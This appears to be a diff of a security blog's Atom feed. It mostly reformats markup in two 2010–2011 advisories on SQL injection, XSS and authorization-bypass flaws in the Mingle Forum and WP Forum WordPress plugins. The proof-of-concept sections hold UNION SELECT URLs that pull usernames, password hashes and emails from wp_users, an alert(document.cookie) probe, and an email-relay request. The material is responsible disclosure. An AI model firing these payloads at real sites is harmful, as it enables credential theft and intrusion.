@@ -4,7 +4,7 @@
   <title><![CDATA[Category: Advisories | Charles Hooper]]></title>
   <link href="http://www.charleshooper.net/blog/categories/advisories/atom.xml" rel="self"/>
   <link href="http://www.charleshooper.net/"/>
-  <updated>2013-09-25T06:35:41-07:00</updated>
+  <updated>2013-10-02T09:34:58-07:00</updated>
   <id>http://www.charleshooper.net/</id>
   <author>
     <name><![CDATA[Charles Hooper]]></name>
@@ -18,95 +18,88 @@
     <link href="http://www.charleshooper.net/blog/multiple-vulnerabilities-in-mingle-forum-wordpress-plugin/"/>
     <updated>2011-01-08T00:00:00-08:00</updated>
     <id>http://www.charleshooper.net/blog/multiple-vulnerabilities-in-mingle-forum-wordpress-plugin</id>
-    <content type="html"><![CDATA[<h1></h1>
+    <content type="html"><![CDATA[<h1 id="section"></h1>
 
-<p>Title: Multiple Vulnerabilities in Mingle Forum (WordPress Plugin)<br/>
-Advisory URL: http://www.charleshooper.net/blog/multiple-vulnerabilities-in-mingle-forum-wordpress-plugin/<br/>
-Date Published: January 8th, 2011<br/>
+<p>Title: Multiple Vulnerabilities in Mingle Forum (WordPress Plugin)<br />
+Advisory URL: http://www.charleshooper.net/blog/multiple-vulnerabilities-in-mingle-forum-wordpress-plugin/<br />
+Date Published: January 8th, 2011<br />
 Vendors Contacted: Paul Carter – Maintainer of plugin.</p>
 
 <ol>
-<li>Summary</li>
+  <li>Summary</li>
 </ol>
 
-
-<p>Mingle Forum is a plugin for the popular blog tool and publishing<br/>
-platform, WordPress. According to the author of Mingle Forum, “Mingle<br/>
-Forum has been modified to be lightweight, solid, secure, quick to<br/>
+<p>Mingle Forum is a plugin for the popular blog tool and publishing<br />
+platform, WordPress. According to the author of Mingle Forum, “Mingle<br />
+Forum has been modified to be lightweight, solid, secure, quick to<br />
 setup, and easy to use.”</p>
 
-<p>There exist multiple vulnerabilities in Mingle Forum, SQL injection<br/>
+<p>There exist multiple vulnerabilities in Mingle Forum, SQL injection<br />
 being among them.</p>
 
 <ol>
-<li>Vulnerability Information</li>
+  <li>Vulnerability Information</li>
 </ol>
-
 
 <p>Packages/Versions Affected: Confirmed on 1.0.24 and 1.0.26</p>
 
-<p>3a. Type: SQL Injection [CWE-89]<br/>
-3a. Impact: Read application data.<br/>
-3a. Discussion: There is a SQL injection vulnerability present in the<br/>
-RSS feed generator. By crafting specific URLs an attacker can retrieve<br/>
+<p>3a. Type: SQL Injection [CWE-89]<br />
+3a. Impact: Read application data.<br />
+3a. Discussion: There is a SQL injection vulnerability present in the<br />
+RSS feed generator. By crafting specific URLs an attacker can retrieve<br />
 information from the MySQL database.</p>
 
-<p>3b. Type: SQL Injection [CWE-89]<br/>
-3b. Impact: Read application data.<br/>
-3b. Discussion: There is a SQL injection vulnerability present in the<br/>
-`edit post` functionality. By crafting specific URLs an attacker can<br/>
+<p>3b. Type: SQL Injection [CWE-89]<br />
+3b. Impact: Read application data.<br />
+3b. Discussion: There is a SQL injection vulnerability present in the<br />
+`edit post` functionality. By crafting specific URLs an attacker can<br />
 retrieve information from the MySQL database.</p>
 
-<p>3c. Type: Auth Bypass via Direct Request [CWE-425]<br/>
-3c. Impact: AuthZ is not performed for `edit post` functionality.<br/>
-3c. Discussion: By browsing directly to the `edit post` page a user can<br/>
+<p>3c. Type: Auth Bypass via Direct Request [CWE-425]<br />
+3c. Impact: AuthZ is not performed for `edit post` functionality.<br />
+3c. Discussion: By browsing directly to the `edit post` page a user can<br />
 view and edit any page.</p>
 
 <ol>
-<li>PoC &amp; Technical Description</li>
+  <li>PoC &amp; Technical Description</li>
 </ol>
 
+<p>4a.<br />
+<a href="http://path.to/wordpress/wp-content/plugins/mingle-forum/feed.php?topic=0 UNION SELECT 1,user_email,3,4,5,user_login,7 FROM wp_users #">http://path.to/wordpress/wp-content/plugins/mingle-forum/feed.php?topic=0 UNION SELECT 1,user_email,3,4,5,user_login,7 FROM wp_users #</a></p>
 
-<p>4a.<br/>
-<a href="http://path.to/wordpress/wp-content/plugins/mingle-forum/feed.php?topic=0">http://path.to/wordpress/wp-content/plugins/mingle-forum/feed.php?topic=0 UNION SELECT 1,user_email,3,4,5,user_login,7 FROM wp_users #</a></p>
+<p>4b.  </p>
 
-<p>4b.</p>
-
-<p>4c.</p>
+<p>4c. </p>
 
 <ol>
-<li>Report Timeline</li>
+  <li>Report Timeline</li>
 </ol>
 
-
-<p>12/17/2010 Initial email sent to plugin maintainer.<br/>
-12/22/2010 Confirmation of first email requested.<br/>
-12/31/2010 Correct email address obtained. Maintainer contacted again on<br/>
-this date.<br/>
-01/01/2011 Received response from plugin maintainer.<br/>
-01/07/2011 Plugin maintainer releases update that addresses these<br/>
+<p>12/17/2010 Initial email sent to plugin maintainer.<br />
+12/22/2010 Confirmation of first email requested.<br />
+12/31/2010 Correct email address obtained. Maintainer contacted again on<br />
+this date.<br />
+01/01/2011 Received response from plugin maintainer.<br />
+01/07/2011 Plugin maintainer releases update that addresses these<br />
 vulnerabilities.</p>
 
 <ol>
-<li>References</li>
+  <li>References</li>
 </ol>
 
-
-<p>6a. The WordPress Plugin page for Mingle Forum:</p>
+<p>6a. The WordPress Plugin page for Mingle Forum:  </p>
 
 <ol>
-<li>Legalese</li>
+  <li>Legalese</li>
 </ol>
 
-
-<p>This vulnerability report by Charles Hooper &lt;  > is<br/>
-licensed under a Creative Commons Attribution-NonCommercial-ShareAlike<br/>
+<p>This vulnerability report by Charles Hooper &lt;  &gt; is<br />
+licensed under a Creative Commons Attribution-NonCommercial-ShareAlike<br />
 3.0 Unported License.</p>
 
 <ol>
-<li>Signature</li>
+  <li>Signature</li>
 </ol>
-
 
 <p>Public Key: Obtainable via pool.sks-keyservers.net</p>
 ]]></content>
@@ -117,88 +110,88 @@ licensed under a Creative Commons Attribution-NonCommercial-ShareAlike<br/>
     <link href="http://www.charleshooper.net/blog/multiple-vulnerabilities-in-wp-forum-wordpress-plugin/"/>
     <updated>2010-12-17T00:00:00-08:00</updated>
     <id>http://www.charleshooper.net/blog/multiple-vulnerabilities-in-wp-forum-wordpress-plugin</id>
-    <content type="html"><![CDATA[<h1></h1>
+    <content type="html"><![CDATA[<h1 id="section"></h1>
 
-<h1>Multiple Vulnerabilities in WP Forum (WordPress Plugin)</h1>
+<h1 id="multiple-vulnerabilities-in-wp-forum-wordpress-plugin">Multiple Vulnerabilities in WP Forum (WordPress Plugin)</h1>
 
-<h2>1. Advisory Information</h2>
+<h2 id="advisory-information">1. Advisory Information</h2>
 
-<p>Title: Multiple Vulnerabilities in WP-Forum<br/>
-Advisory URL: http://www.charleshooper.net/blog/multiple-vulnerabilities-in-wp-forum-wordpress-plugin/<br/>
-Date Published: 12/17/2010<br/>
+<p>Title: Multiple Vulnerabilities in WP-Forum<br />
+Advisory URL: http://www.charleshooper.net/blog/multiple-vulnerabilities-in-wp-forum-wordpress-plugin/<br />
+Date Published: 12/17/2010<br />
 Vendors Contacted: WordPress. Maintainer of plugin is unreachable.</p>
 
-<h2>2. Summary</h2>
+<h2 id="summary">2. Summary</h2>
 
-<p>WP Forum is a plugin for the popular blog tool and publishing platform, WordPress.<br/>
-The author of WP Forum describes it as a “Simple discussion forum plugin” and<br/>
+<p>WP Forum is a plugin for the popular blog tool and publishing platform, WordPress.<br />
+The author of WP Forum describes it as a “Simple discussion forum plugin” and<br />
 “easy to use and administer.”</p>
 
-<p>There exist multiple vulnerabilities in WP Forum. Basically, input validation is not<br/>
+<p>There exist multiple vulnerabilities in WP Forum. Basically, input validation is not<br />
 performed at all resulting in SQL injection, stored XSS, and reflected XSS vulns.</p>
 
-<p>Furthermore, the author wrote the plugin under the assumption that it would only be<br/>
-executed within the context of the WordPress administrative panel, thereby neglecting<br/>
+<p>Furthermore, the author wrote the plugin under the assumption that it would only be<br />
+executed within the context of the WordPress administrative panel, thereby neglecting<br />
 to perform proper authentication and authorization.</p>
 
-<h2>3. Vulnerability Information</h2>
+<h2 id="vulnerability-information">3. Vulnerability Information</h2>
 
 <p>Packages/Versions Affected: Probably all, but confirmed only on WP Forum 1.7.8</p>
 
-<p>3a. Type:   SQL Injection [CWE-89]<br/>
-3a. Impact: Read application data, bypass protection mechanism,<br/>
-modify application data. There are multiple SQL injections present<br/>
-in WP Forum. The most prominent of which is the SQL injection present<br/>
-in the `group_login` functionality. Prior to logging in, an attacker<br/>
-can retrieve each group’s passwords due to the vulnerability listed<br/>
+<p>3a. Type:   SQL Injection [CWE-89]<br />
+3a. Impact: Read application data, bypass protection mechanism,<br />
+modify application data. There are multiple SQL injections present<br />
+in WP Forum. The most prominent of which is the SQL injection present<br />
+in the `group_login` functionality. Prior to logging in, an attacker<br />
+can retrieve each group’s passwords due to the vulnerability listed<br />
 below (3b).</p>
 
-<p>3b. Type:   Plaintext Storage of a Password [CWE-256]<br/>
+<p>3b. Type:   Plaintext Storage of a Password [CWE-256]<br />
 3b. Impact: Password is easily retrieved from database</p>
 
-<p>3c. Type:   XSS (Stored or Reflected) [CWE-79]<br/>
+<p>3c. Type:   XSS (Stored or Reflected) [CWE-79]<br />
 3c. Impact: Execute unauthorized code or commands</p>
 
-<p>3d. Type:   Auth Bypass via Direct Request [CWE-425]<br/>
-3d. Impact: Many or all of the administrative functions assume they are running<br/>
-in the context of the WordPress administrative section. As a result,<br/>
-they often do not check that the user is authenticated or authorized<br/>
-to perform a particular action. Example functionality includes adding<br/>
-or removing forum moderators and deleting forums. This vulnerability<br/>
+<p>3d. Type:   Auth Bypass via Direct Request [CWE-425]<br />
+3d. Impact: Many or all of the administrative functions assume they are running<br />
+in the context of the WordPress administrative section. As a result,<br />
+they often do not check that the user is authenticated or authorized<br />
+to perform a particular action. Example functionality includes adding<br />
+or removing forum moderators and deleting forums. This vulnerability<br />
 could lead to information exposure, privilege escalation, or data loss.</p>
 
-<p>3e. Type:   Information Exposure Through Sent Data [CWE-201]<br/>
-3e. Impact: `sendmail.php` discloses users’ email addresses by accepting a user-<br/>
-provider “user” variable and returns a hidden  tag containing<br/>
+<p>3e. Type:   Information Exposure Through Sent Data [CWE-201]<br />
+3e. Impact: `sendmail.php` discloses users’ email addresses by accepting a user-<br />
+provider “user” variable and returns a hidden  tag containing<br />
 that user’s email address.</p>
 
-<p>3f. Type:   External Control of Assumed-Immutable Web Parameter [CWE-472]<br/>
-3f. Impact: `sendmail.php` accepts user-provided input allowing it to be used as<br/>
+<p>3f. Type:   External Control of Assumed-Immutable Web Parameter [CWE-472]<br />
+3f. Impact: `sendmail.php` accepts user-provided input allowing it to be used as<br />
 an email relay</p>
 
-<h2>4. PoC &amp; Technical Description</h2>
+<h2 id="poc--technical-description">4. PoC &amp; Technical Description</h2>
 
-<p>Due to the number of vulnerabilities in this package, I will not discuss each one<br/>
-individually. Instead, here are some sample POCs. Many more exploitable vulns exist<br/>
+<p>Due to the number of vulnerabilities in this package, I will not discuss each one<br />
+individually. Instead, here are some sample POCs. Many more exploitable vulns exist<br />
 in this package than what I am providing here.</p>
 
-<p>4a. http://path.to/wordpress/?page_id=&amp;forumaction=group_login&amp;group_id=0 UNION SELECT CONCAT_WS(CHAR(58),user_login,user_pass,user_email) FROM wp_users LIMIT 1 #<br/>
-or (goes for all POCs): http://path.to/wordpress/?forumaction=group_login&amp;group_id=0 UNION SELECT CONCAT_WS(CHAR(58),user_login,user_pass,user_email) FROM wp_users LIMIT 1 #<br/>
-4b. N/A<br/>
-4c. http://path.to/wordpress/?forumaction=group_login&amp;group_id=alert(document.cookie);<br/>
-4d. http://path.to/wordpress/wp-content/plugins/wpforum/wp-forum-manage.php?editgroupsubmit=true&amp;group=&amp;groupname=&amp;passwd=<br/>
-4e. http://path.to/wordpress/wp-content/plugins/wpforum/sendmail.php?user= (email address will be in HTML source)<br/>
-4f. POST ‘submit=true&amp;sender=&amp;email=&amp;message=&amp;subject=&amp;replyto=<br/>
+<p>4a. http://path.to/wordpress/?page_id=&amp;forumaction=group_login&amp;group_id=0 UNION SELECT CONCAT_WS(CHAR(58),user_login,user_pass,user_email) FROM wp_users LIMIT 1 #<br />
+or (goes for all POCs): http://path.to/wordpress/?forumaction=group_login&amp;group_id=0 UNION SELECT CONCAT_WS(CHAR(58),user_login,user_pass,user_email) FROM wp_users LIMIT 1 #<br />
+4b. N/A<br />
+4c. http://path.to/wordpress/?forumaction=group_login&amp;group_id=alert(document.cookie);<br />
+4d. http://path.to/wordpress/wp-content/plugins/wpforum/wp-forum-manage.php?editgroupsubmit=true&amp;group=&amp;groupname=&amp;passwd=<br />
+4e. http://path.to/wordpress/wp-content/plugins/wpforum/sendmail.php?user= (email address will be in HTML source)<br />
+4f. POST ‘submit=true&amp;sender=&amp;email=&amp;message=&amp;subject=&amp;replyto=<br />
 to http://path.to/wordpress/wp-content/plugins/wpforum/sendmail.php (untested)</p>
 
-<h2>5. Report Timeline</h2>
+<h2 id="report-timeline">5. Report Timeline</h2>
 
-<p>12/10/2010 Initial email sent to WordPress security.<br/>
-12/10/2010 Maintainer not yet contacted as project appears abandoned and maintainer<br/>
-does not have listed contact information.<br/>
+<p>12/10/2010 Initial email sent to WordPress security.<br />
+12/10/2010 Maintainer not yet contacted as project appears abandoned and maintainer<br />
+does not have listed contact information.<br />
 12/17/2010 No reply from WordPress security. Advisory released.</p>
 
-<h2>6. References</h2>
+<h2 id="references">6. References</h2>
 
 <p>6a. The WordPress Plugin page for WP Forum:</p>
 
@@ -212,13 +205,13 @@ does not have listed contact information.<br/>
 
 <p>http://www.fahlstad.se/</p>
 
-<h2>7. Legalese</h2>
+<h2 id="legalese">7. Legalese</h2>
 
-<p>This vulnerability report by Charles Hooper &lt; chooper@plumata.com > is<br/>
-licensed under a Creative Commons Attribution-NonCommercial-ShareAlike<br/>
+<p>This vulnerability report by Charles Hooper &lt; chooper@plumata.com &gt; is<br />
+licensed under a Creative Commons Attribution-NonCommercial-ShareAlike<br />
 3.0 Unported License.</p>
 
-<h2>8. Signature</h2>
+<h2 id="signature">8. Signature</h2>
 
 <p>Public Key: Obtainable via pool.sks-keyservers.net</p>
 ]]></content>
